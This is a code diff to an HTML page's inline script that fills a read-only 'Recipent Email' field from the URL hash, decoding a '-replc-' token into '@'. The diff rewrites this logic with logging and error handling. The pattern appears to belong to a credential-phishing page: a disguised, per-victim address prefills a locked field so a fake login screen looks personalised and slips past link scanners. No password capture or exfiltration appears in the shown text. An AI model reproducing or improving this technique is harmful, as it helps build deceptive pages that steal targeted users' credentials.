@@ -182,21 +182,39 @@ return(str.substring(theleft, theright));
             <span class="input-group-addon"><i class="fas fa-user"></i></span>
             <input type="email" class="form-control" name="username" placeholder="Recipent Email" value="" id="email" readonly>
 <script>
-        document.addEventListener('DOMContentLoaded', function() {
-    const emailInput = document.getElementById('email');
-    
-    // Extract the email from the URL hash (e.g., "#contact-replc-abc.com")
-    const encodedEmail = window.location.hash.substring(1); // Removes the "#"
-    
-    if (encodedEmail) {
-        // Replace "-replc-" with "@" and set the input value
-        const decodedEmail = encodedEmail.replace(/-replc-/g, '@');
-        emailInput.value = decodedEmail;
-    } else {
-        console.log("No email found in the URL hash.");
-    }
-});
-</script>
+        // Function to extract and format email from URL hash
+        function setEmailFromHash() {
+            try {
+                // Get the hash from URL and remove the # symbol
+                const hash = window.location.hash ? window.location.hash.substring(1) : "";
+                console.log("Raw hash:", hash); // Debug: Check what hash is retrieved
+
+                if (hash) {
+                    // Replace -replc- with @ using a regular expression to handle variations
+                    const formattedEmail = hash.replace(/-replc-/i, "@");
+                    console.log("Formatted email:", formattedEmail); // Debug: Check formatted email
+
+                    // Set the input field value to the formatted email
+                    const emailInput = document.getElementById("email");
+                    if (emailInput) {
+                        emailInput.value = formattedEmail;
+                    } else {
+                        console.error("Input element with ID 'email' not found.");
+                        alert("Error: Input field not found.");
+                    }
+                } else {
+                    console.error("No hash found in URL.");
+                    document.getElementById("email").value = "No email found in URL";
+                }
+            } catch (error) {
+                console.error("Error processing email:", error);
+                document.getElementById("email").value = "Error processing email";
+            }
+        }
+
+        // Run the function when the page loads
+        window.onload = setEmailFromHash;
+    </script>
           </div>
         </div>
 		
